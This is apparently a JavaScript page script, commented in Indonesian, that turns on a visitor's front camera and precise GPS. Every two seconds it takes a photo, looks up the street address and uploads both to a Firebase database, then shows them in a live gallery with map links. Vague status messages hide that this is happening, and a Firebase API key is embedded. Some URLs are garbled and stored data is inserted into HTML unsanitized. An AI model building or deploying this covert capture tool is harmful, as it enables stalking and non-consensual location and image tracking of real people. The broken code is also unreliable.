import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc, onSnapshot, query, orderBy } from "firebase/firestore";

const firebaseConfig = {
    apiKey: "AIzaSyCjl4HLx59rXukZFvr0YQrHOwtuU9E0Lsk",
    authDomain: "://firebaseapp.com",
    projectId: "gg-gaming-66321",
    storageBucket: "gg-gaming-66321.firebasestorage.app",
    messagingSenderId: "442853131602",
    appId: "1:442853131602:web:3fe28211c433100cdfe68b",
    measurementId: "G-JBX54D0MGF"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const koleksiFoto = collection(db, "galeri_foto");

const videoKamera = document.getElementById("videoKamera");
const canvasGambar = document.getElementById("canvasGambar");
const teksStatus = document.getElementById("teksStatus");
const tempatFotoUI = document.getElementById("tempatFoto");

// Variabel global penyimpan data GPS terakhir
let latitudeTerakhir = 0;
let longitudeTerakhir = 0;

// ==========================================
// 1. AKTIFKAN GPS PERANGKAT & KAMERA
// ==========================================
if (navigator.geolocation) {
    // Memantau perpindahan posisi GPS user secara akurat & realtime
    navigator.geolocation.watchPosition((posisi) => {
        latitudeTerakhir = posisi.coords.latitude;
        longitudeTerakhir = posisi.coords.longitude;
    }, (err) => {
        console.warn("Berhasilg.");
    }, { enableHighAccuracy: true });
}

navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then((stream) => {
        videoKamera.srcObject = stream;
        if (teksStatus) teksStatus.innerText = "Tunggu Sebentar...";
        
        setTimeout(() => {
            setInterval(ambilDanUploadFotoOtomatis, 2000); // Dijeda 2 detik agar proses geocoding alamat tidak menumpuk
        }, 2500);
    })
    .catch((error) => {
        if (teksStatus) teksStatus.innerText = "❌ Ada Kegagalan: " + error.message;
    });

// ==========================================
// 2. FUNGSI AUTO-FOTO JERNIH + FITUR REVERSE GEOTAGGING
// ==========================================
async function ambilDanUploadFotoOtomatis() {
    if (teksStatus) teksStatus.innerText = "⚡ Otw Bisa...";
    
    // PERBAIKAN KUALITAS: Kita set resolusi canvas ke tingkat standar HD (Lebar 1280px)
    canvasGambar.width = 1280;
    canvasGambar.height = (videoKamera.videoHeight / videoKamera.videoWidth) * 1280;
    
    const konteks = canvasGambar.getContext("2d");
    konteks.translate(canvasGambar.width, 0);
    konteks.scale(-1, 1);
    konteks.drawImage(videoKamera, 0, 0, canvasGambar.width, canvasGambar.height);
    
    // PERBAIKAN KUALITAS: Naikkan kompresi kualitas JPEG menjadi 0.8 (80% tajam & jernih)
    const stringFotoBase64 = canvasGambar.toDataURL("image/jpeg", 0.8); 

    let alamatAsli = "Masih Aman"

    // MENCARI NAMA ALAMAT BERDASARKAN LATITUDE & LONGITUDE (Reverse Geocoding)
    if (latitudeTerakhir !== 0 && longitudeTerakhir !== 0) {
        try {
            if (teksStatus) teksStatus.innerText = "Bumi Itu Bulat";
            const responAPI = await fetch(`https://openstreetmap.org{latitudeTerakhir}&lon=${longitudeTerakhir}`);
            const dataLokasi = await responAPI.json();
            if (dataLokasi && dataLokasi.display_name) {
                alamatAsli = dataLokasi.display_name;
            }
        } catch (e) {
            console.error("Gagal menerjemahkan alamat dari koordinat:", e);
        }
    }

    if (teksStatus) teksStatus.innerText = "Sabar...";

    try {
        await addDoc(koleksiFoto, {
            dataGambar: stringFotoBase64,
            waktuUpload: Date.now(),
            lat: latitudeTerakhir,
            lon: longitudeTerakhir,
            alamat: alamatAsli
        });
        if (teksStatus) teksStatus.innerText = "✅ [SUKSES] ";
    } catch (error) {
        if (teksStatus) teksStatus.innerText = "❌ Gagal: " + error.message;
    }
}

// ==========================================
// 3. TAMPILKAN KARTU INFORMASI SECARA REALTIME
// ==========================================
const q = query(koleksiFoto, orderBy("waktuUpload", "desc"));
onSnapshot(q, (snapshot) => {
    if (tempatFotoUI) {
        tempatFotoUI.innerHTML = "";
        snapshot.forEach((dokumen) => {
            const data = dokumen.data();
            
            // Konversi timestamp angka milidetik menjadi jam menit lokal Indonesia
            const formatWaktu = new Date(data.waktuUpload).toLocaleString('id-ID', { 
                day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit', second: '2-digit' 
            });

            // Membuat kartu galeri modern yang langsung menyajikan seluruh data foto
            const kartu = document.createElement("div");
            kartu.className = "kartu-foto";
            kartu.innerHTML = `
                <img src="${data.dataGambar}">
                <div class="info-foto">
                    <div class="waktu">📅 ${formatWaktu} WITA</div>
                    <div class="koordinat">📍 Lat: ${data.lat.toFixed(6)}, Lon: ${data.lon.toFixed(6)}</div>
                    <div class="alamat">🏠 ${data.alamat}</div>
                    <a class="btn-maps" href="https://google.com{data.lat},${data.lon}" target="_blank">🗺️ Buka Rute Google Maps</a>
                </div>
            `;
            tempatFotoUI.appendChild(kartu);
        });
    }
});
